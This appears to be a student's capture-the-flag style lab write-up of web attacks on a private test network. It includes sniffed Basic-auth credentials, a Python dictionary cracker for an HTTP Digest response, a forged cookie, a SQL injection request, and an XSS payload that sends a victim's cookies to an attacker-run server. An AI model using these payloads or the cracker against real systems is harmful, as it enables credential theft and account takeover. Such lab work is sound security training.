# 1

## Packet
```
IP 192.168.14.3.46826 > 192.168.14.1.80: Flags [P.], seq 1:143, ack 1, win 502, options [nop,nop,TS val 1452909150 ecr 2428281190], length 142: HTTP: GET /secret/file HTTP/1.1
E.....@.@..............P.Tw.|..j...........
V..^...fGET /secret/file HTTP/1.1
Host: 192.168.14.1
Authorization: Basic dHJhdmlzMTQ6bWFpdkRlY2d1cjIyMDI=
User-Agent: curl/7.58.0
Accept: */*
```

## User/Pass:
`travis14:maivDecgur2202`

## Contents:
```html
I'm going to let you in on a little secret. Every day, once a day, give yourself a present. Don’t plan it; don’t wait for it; just let it happen.
- Dale Cooper
```
# 2
## Packet
```
182203 IP 192.168.14.2.36586 > 192.168.14.1.80: Flags [P.], seq 91:464, ack 308, win 501, options [nop,nop,TS val 422351445 ecr 1957960104], length 373: HTTP: HEAD /secret/cheese HTTP/1.1
E.....@.@..v...........P,..................
.,.Ut...HEAD /secret/cheese HTTP/1.1
Host: 192.168.14.1
Authorization: Digest username="travis14", realm="Cheese", nonce="/DPYEFbSBQA=c06893026441a70acf049b49540e97acd2bdd640", uri="/secret/cheese", cnonce="ZjdlNTk0ZGZmMDQwZTU3OTM2MTIxOGEyNzljNDJlYzc=", nc=00000001, qop=auth, response="872aafc461761e417d2df47b85e43d2b", algorithm="MD5"
User-Agent: curl/7.58.0
Accept: */*
```

## Crack
```python
# HTTP Digest Authentication cracker
import hashlib

username = "travis14"
realm = "Cheese"
nonce = "/DPYEFbSBQA=c06893026441a70acf049b49540e97acd2bdd640"
uri = "/secret/cheese"
qop = "auth"
nc = "00000001"
cnonce = "ZjdlNTk0ZGZmMDQwZTU3OTM2MTIxOGEyNzljNDJlYzc="
response = "872aafc461761e417d2df47b85e43d2b"

# Calculate the response
with open("10k-most-common.txt") as f:
    for line in f:
        line = line.strip('\n').strip()
        ha1 = hashlib.md5((username + ":" + realm + ":" + line).encode('utf-8')).hexdigest()
        ha2 = hashlib.md5(("HEAD" + ":" + uri).encode('utf-8')).hexdigest()
        response = hashlib.md5((ha1 + ":" + nonce + ":" + nc + ":" + cnonce + ":" + qop + ":" + ha2).encode('utf-8')).hexdigest()
        # print(line + ":" + response)
        if (response == "872aafc461761e417d2df47b85e43d2b"):
            print("Password: " + line)
            break

```
## Password
`Password: domain`

##Contents:
```
Intelligence alone is not nearly enough when it comes to acting wisely.

— Fyodor Dostoevsky
```

# 3
## Cookie
`Stephen2019-11-03T12%3A44%3A21Z`

# 4
The secret to figuring out the SQL injection was ~~trying everything~~ tuning the query to stop returning Error 500.

## Request
`picture=char-kway-teow.jpg'+OR+1=1+AND'user=alice--`

## Response
`The best char kway teow is Penang char kway teow (lat: 5.411135 / lng: 100.330462)`

# 5

## XSS
```html
<script>document.location="http://192.168.14.3:8080/?cookie="+document.cookie;</script>
```

## Cookie
`GET /?cookie=auth=Iwillseeyouagainin32years. HTTP/1.1" 200 -`

## Writeup
The main additional thing I did was start up a `SimpleHTTPServer` on port 8080 of the server I have SSH access to. The attack works because the server is making an HTTP request to that port with the cookie being that of the browser.

# 6
